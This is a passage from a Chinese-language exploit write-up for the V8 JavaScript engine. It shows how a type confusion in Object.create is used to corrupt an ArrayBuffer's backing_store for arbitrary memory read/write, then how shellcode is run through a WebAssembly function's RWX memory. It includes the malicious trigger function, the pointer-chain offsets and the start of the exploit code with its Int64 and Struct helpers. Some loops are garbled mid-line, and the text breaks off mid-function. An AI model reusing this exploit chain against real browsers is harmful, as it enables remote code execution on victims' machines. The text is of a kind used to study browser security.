其长度由`byte_length`指定，而实际读写的内存位于`backing_store`，当可以修改一个`ArrayBuffer`的`backing_store`时就可以对任意地址进行读写。而此成员在结构体中的偏移是0x20:
    wndbg> x /10gx 0x1d4b8ef8e1a8
    0x1d4b8ef8e1a8: 0x0000350743c04371  0x0000236c6c482cf1
    0x1d4b8ef8e1b8: 0x0000236c6c482cf1  0x0000000000000400
    0x1d4b8ef8e1c8: 0x00005652a87208f0  0x0000000000000002
    0x1d4b8ef8e1d8: 0x0000000000000000  0x0000000000000000
    0x1d4b8ef8e1e8: 0x0000000000000000  0x0000000000000000
此时我们仅需构造一个对偏移+0x20写的操作就可以控制`ArrayBuffer`的读写内存。此时根据对`FastProperties`的了解，如果构建`Object`为`{x0:{x1:1.1,x2:1.2}}`，则对`x0.x2`的写操作，恰好可以改变对应键值的`backing_store`，造成内存任意写。
因此恶意函数构造如下：
    function bad_create(o,value){
                o.a;
                this.Object.create(o);
                let ret = o.${X}.x0.x2;
                 o.${X}.x0.x2 = value;
                return ret;
            }
### Shellcode执行
综上，拥有了`addrof`原语和任意地址读写的能力，可以利用`wasm`机制来执行`shellcode`。
例如一个`wasm`实例构造如下：
    var buffer = new Uint8Array([0,97,115,109,1,0,0,0,1,138,128,128,128,0,2,96,0,1,127,96,1,127,1,127,2,140,128,128,128,0,1,3,101,110,118,4,112,117,116,115,0,1,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,146,128,128,128,0,2,6,109,101,109,111,114,121,2,0,5,112,52,110,100,97,0,1,10,145,128,128,128,0,1,139,128,128,128,0,1,1,127,65,16,16,0,26,32,0,11,11,150,128,128,128,0,1,0,65,16,11,16,72,97,99,107,101,100,32,98,121,32,80,52,110,100,97,0]);
        var wasmImports = {
          env: {
            puts: function puts (index) {
              console.log(utf8ToString(h, index));
            }
          }
        };
        let m = new WebAssembly.Instance(new WebAssembly.Module(buffer),wasmImports);
        let h = new Uint8Array(m.exports.memory.buffer);
        let f = m.exports.p4nda;
        f();
其中，`f`是一个`JSFunction`对象，只不过其实际执行代码存放于一个`rwx`的内存中，通过写该内存的代码区域，最终调用`f()`，触发来执行`shellcode`。
具体思路如下:
首先，构造`wasm`对象`f`方便`shellcode`执行，并利用`addrof`原语泄露`f`的地址。
然后，定义一个`ArrayBuffer`对象，并利用`gc`机制使其被放入`Old Space`使地址更加稳定。
之后，不断的利用该`ArrayBuffer`对象，泄露并修改其`backing_store`成员指向待读写区域，具体修改顺序为从`JSFucntion`到`rwx`区域的寻址流程：
    JSFucntion -(0x18)->SharedFunctionInfo -(0x8)-> WasmExportedFunctionData -(0x10)-> WasmInstanceObject -(0xc8)-> imported_function_targets -(0)-> rwx_area
最终，向`rwx_area`写入`shellcode`，调用`f()`触发。
具体利用效果如下：
### EXP
    function gc()
    {
        /*fill-up the 1MB semi-space page, force V8 to scavenge NewSpace.*/
        for(var i=0;i 8)
                parts.splice(8, 0, ' ');
            lines.push(parts.join(' '));
        }
        return lines.join('\n');
    }
    // Simplified version of the similarly named python module.
    var Struct = (function() {
        // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
        var buffer      = new ArrayBuffer(8);
        var byteView    = new Uint8Array(buffer);
        var uint32View  = new Uint32Array(buffer);
        var float64View = new Float64Array(buffer);
        return {
            pack: function(type, value) {
                var view = type;        // See below
                view[0] = value;
                return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
            },
            unpack: function(type, bytes) {
                if (bytes.length !== type.BYTES_PER_ELEMENT)
                    throw Error("Invalid bytearray");
                var view = type;        // See below
                byteView.set(bytes);
                return view[0];
            },
            // Available types.
            int8:    byteView,
            int32:   uint32View,
            float64: float64View
        };
    })();
    //
    // Tiny module that provides big (64bit) integers.
    //
    // Copyright (c) 2016 Samuel Groß
    //
    // Requires utils.js
    //
    // Datatype to represent 64-bit integers.
    //
    // Internally, the integer is stored as a Uint8Array in little endian byte order.
    function Int64(v) {
        // The underlying byte array.
        var bytes = new Uint8Array(8);
        switch (typeof v) {
            case 'number':
                v = '0x' + Math.floor(v).toString(16);
            case 'string':
                if (v.startsWith('0x'))
                    v = v.substr(2);
                if (v.length % 2 == 1)
                    v = '0' + v;
                var bigEndian = unhexlify(v, 8);
                bytes.set(Array.from(bigEndian).reverse());
                break;
            case 'object':
                if (v instanceof Int64) {
                    bytes.set(v.bytes());
                } else {
                    if (v.length != 8)
                        throw TypeError("Array must have excactly 8 elements.");
                    bytes.set(v);
                }
                break;
            case 'undefined':
                break;
            default:
                throw TypeError("Int64 constructor requires an argument.");
        }
        // Return a double whith the same underlying bit representation.
        this.asDouble = function() {
            // Check for NaN
            if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
                throw new RangeError("Integer can not be represented by a double");
            return Struct.unpack(Struct.float64, bytes);
        };
        // Return a javascript value with the same underlying bit representation.
        // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
        // due to double conversion constraints.
        this.asJSValue = function() {
            if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xff))
                throw new RangeError("Integer can not be represented by a JSValue");
            // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
            this.assignSub(this, 0x1000000000000);
            var res = Struct.unpack(Struct.float64, bytes);
            this.assignAdd(this, 0x1000000000000);
            return res;
        };
        // Return the underlying bytes of this number as array.
        this.bytes = function() {
            return Array.from(bytes);
        };
        // Return the byte at the given index.
        this.byteAt = function(i) {
            return bytes[i];
        };
        // Return the value of this number as unsigned hex string.
        this.toString = function() {
            return '0x' + hexlify(Array.from(bytes).reverse());
        };
        // Basic arithmetic.
        // These functions assign the result of the computation to their 'this' object.
        // Decorator for Int64 instance operations. Takes care
        // of converting arguments to Int64 instances if required.
        function operation(f, nargs) {
            return function() {
                if (arguments.length != nargs)
                    throw Error("Not enough arguments for function " + f.name);
                for (var i = 0; i  0xff | 0;
                bytes[i] = cur;
            }
            return this;
        }, 2);
        // this = a - b
        this.assignSub = operation(function sub(a, b) {
            var carry = 0;
            for (var i = 0; i < 8; i++) {
                var cur = a.byteAt(i) - b.byteAt(i) - carry;
                carry = cur < 0 | 0;
                bytes[i] = cur;
            }
            return this;
        }, 2);
    }
    // Constructs a new Int64 instance with the same bit representation as the provided double.
    Int64.fromDouble = function(d) {
        var bytes = Struct.pack(Struct.float64, d);
        return new Int64(bytes);
    };
    // Convenience functions. These allocate a new Int64 to hold the result.
    // Return -n (two's complement)
    function Neg(n) {